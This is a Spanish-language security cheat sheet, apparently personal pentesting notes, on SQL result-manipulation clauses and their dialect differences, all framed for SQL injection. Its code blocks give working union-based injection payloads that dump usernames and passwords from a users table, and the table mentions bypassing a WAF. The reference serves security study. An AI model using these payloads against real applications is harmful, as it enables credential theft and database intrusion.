---
aliases:
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: CheatSheet
linked:
  - "[[SQL Commands]]"
---
# SQL - Manipulación de Resultados

***

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SELECT a FROM t1 UNION SELECT b FROM t2` | Combina dos resultados — base de Union-based SQLi | [[SQLi - Union based]]. Misma cantidad y tipo de columnas obligatorio. |
| `SELECT a FROM t1 UNION ALL SELECT b FROM t2` | UNION sin deduplicar — más rápido, no pierde filas duplicadas | Exfil máximo sin pérdida. |
| `ORDER BY 1` (incrementar hasta error) | Cantidad de columnas | Pre-UNION discovery. |
| `ORDER BY 1 ASC` / `DESC` | Orden ascendente/descendente | Standard. |
| `GROUP BY column` | Agrupa filas idénticas | MySQL bug `floor(rand(0)*2)` chain genera errores con data. |
| `HAVING SUM(salary) > 500000` | Filtro sobre grupos (post-GROUP BY) | Alt a `WHERE` si está filtrado por WAF. |
| `LIMIT 10 OFFSET 20` (MySQL/PG) | Filas 21-30 | Iterar exfil 1-fila-a-la-vez. |
| `LIMIT 20,10` (MySQL shorthand) | Mismo que arriba | Sintaxis MySQL más corta. |
| `TOP 10` (MSSQL) | Equivalente a LIMIT en MSSQL | Backend MSSQL. |
| `ROWNUM <= 10` (Oracle) | Equivalente a LIMIT en Oracle | Backend Oracle. |
| `FETCH FIRST 10 ROWS ONLY` (ANSI) | Equivalente moderno ANSI | PostgreSQL/Oracle 12c+/DB2. |
| `SELECT DISTINCT column FROM t` | Valores únicos en columna | Enum de valores sin duplicados. |
| `GROUP_CONCAT(col SEPARATOR ',')` (MySQL) | Múltiples filas en una sola string | Cuando frontend solo refleja 1 fila. |
| `STRING_AGG(col, ',')` (PostgreSQL/MSSQL 2017+) | Equivalente PostgreSQL/MSSQL | Mismo uso. |
| `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)` (Oracle) | Equivalente Oracle | Mismo uso. |
^sql-resultados

### Iteración LIMIT/OFFSET para exfil

```sql
-- Iterar 1 fila por request
' UNION SELECT username,password FROM users LIMIT 0,1-- -
' UNION SELECT username,password FROM users LIMIT 1,1-- -
' UNION SELECT username,password FROM users LIMIT 2,1-- -
```

### GROUP_CONCAT para dump completo en 1 request

```sql
-- Cuando frontend solo refleja primera fila
' UNION SELECT group_concat(username,0x3a,password SEPARATOR 0x0a),NULL FROM users-- -
-- 0x3a = ':', 0x0a = '\n' (separadores en hex para evitar quote escape)
```

___

## Overview

Manipulación de resultados = control de **qué** y **cómo** se devuelve. Clave en SQLi para:

- **`UNION`**: anexar data ajena a query original (base de Union-based).
- **`ORDER BY`**: enumerar columnas (preq para UNION).
- **`GROUP_CONCAT`/`STRING_AGG`**: dump completo en 1 fila reflejada.
- **`LIMIT`/`OFFSET`**: iterar registros cuando frontend solo muestra 1.
- **`GROUP BY` + `floor(rand())`**: trigger errores verbose en MySQL legacy.

Diferencias de sintaxis críticas: `LIMIT` (MySQL/PG) vs `TOP` (MSSQL) vs `ROWNUM` (Oracle) vs `FETCH FIRST` (ANSI moderno).

***
